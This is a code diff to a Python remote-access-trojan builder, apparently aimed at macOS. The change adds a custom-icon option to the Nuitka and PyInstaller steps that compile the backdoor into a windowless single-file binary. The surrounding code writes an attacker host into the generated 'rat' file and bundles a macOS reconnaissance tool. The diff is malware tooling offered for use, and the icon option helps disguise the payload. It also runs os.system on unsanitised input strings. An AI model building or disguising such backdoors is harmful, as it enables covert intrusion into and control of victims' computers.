@@ -385,14 +385,27 @@ def postgen():
         obfuscator.MainMenu(name)
     compiling = input('Do you want to compile the script into a binary (might require sudo) (y/n): ')
     if compiling == 'y':
+        global icochoice
+        icochoice = input("Enter .ico path to set a custom icon (press enter for default): ")
         if encrypted == True:
-            compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
-            os.system(compcomd)
-            print('Saved under "dist" folder')
+            if icochoice:
+                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon='+icochoice+' --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
+                os.system(compcomd)
+                print('Saved under "dist" folder')
+            else:
+                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name+'_or.py'
+                os.system(compcomd)
+                print('Saved under "dist" folder')
+
         else:
-            compcomd = 'python3 -m nuitka --standalone --disable-console --include-module=sandboxed --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
-            os.system(compcomd)
-            os.system(clear)
+            if icochoice:
+                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --macos-onefile-icon='+icochoice+' --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
+                os.system(compcomd)
+                print('Saved under "dist" folder')
+            else:
+                compcomd = 'python3 -m nuitka --standalone --include-module=sandboxed --disable-console --windows-disable-console --onefile --assume-yes-for-downloads --macos-create-app-bundle '+name
+                os.system(compcomd)
+                print('Saved under "dist" folder')
             print(logo)
             print('Backdoor saved under "dist" folder')
 def rep_syst():
@@ -406,6 +419,7 @@ def rep_syst():
         else:
             host2=host
         name2=input('Please enter the name for the rat: ')
+        icochoice = input("Enter .ico path to set a custom icon (press enter for default): ")
         with open(name2, 'a+') as hider:
             hider.write(str('host = "'+host2+'"\n'))
             v= '''
@@ -464,7 +478,11 @@ os.system(dest)
             '''
             hider.write(v)
             hider.close()
-            os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2))
+            if icochoice:
+                os.system('sudo pyinstaller -i '+icochoice+' --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2))
+  
+            else:
+                os.system('sudo pyinstaller --windowed --hidden-import imp --hidden-import socket --hidden-import urllib3 --hidden-import setproctitle --add-data "SwiftBelt:swiftbelt" --add-data "ocr_or.app:ocr" '+str(name2))
 def server():
     import socket
 
